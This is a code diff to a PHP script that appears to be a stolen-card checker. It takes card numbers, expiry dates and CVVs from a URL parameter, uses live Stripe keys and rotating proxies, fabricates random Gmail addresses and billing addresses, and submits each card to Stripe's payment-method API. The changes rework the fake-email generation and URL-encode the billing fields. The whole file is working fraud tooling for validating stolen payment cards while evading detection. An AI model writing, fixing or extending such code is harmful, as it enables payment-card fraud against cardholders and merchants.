@@ -109,7 +109,13 @@ $sec = $_GET['cslive'];
 $pk = $_GET['pklive'];
 $colink = $_GET['colink'];
 $amt = $_GET['xamount'];
-$email = $_GET['xemail'];
+if(empty($_GET['xemail'])) {
+$email = 'phcaliceschuberg'.rand(000000, 999999).'@gmail.com';
+$xemail = urlencode($email);
+} elseif (!empty($_GET['xemail'])) {
+    $email = $_GET['xemail'];
+    $xemail = urlencode($email);
+}
 
 $hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
 $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
@@ -131,12 +137,6 @@ $ips_accounts = array(
 $rotateips = $ips_accounts[array_rand($ips_accounts)];
 $proxy = !empty($ip) ? $ip : ''.$rotateips.'';
 $proxyauth = !empty($hydra) ? $hydra : '';
-
-$email2 = urlencode($email);
-if(empty($email)) {
-$email = 'phcaliceschuberg'.rand(0000, 9999).'@gmail.com';
-}
-$xemail = $email;
 
 list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
 $scc = implode('+', str_split($cc, 4));
@@ -288,7 +288,7 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
 curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.$complete_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.$random_street.'&billing_details[address][city]='.$random_city.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.urlencode($complete_name).'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.urlencode($random_street).'&billing_details[address][city]='.urlencode($random_city).'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F8f6e154302%3B+stripe-js-v3%2F8f6e154302%3B+checkout');
 $pm = curl_exec($ch);
 curl_close($ch);
 $id = g($pm, '"id": "','"');
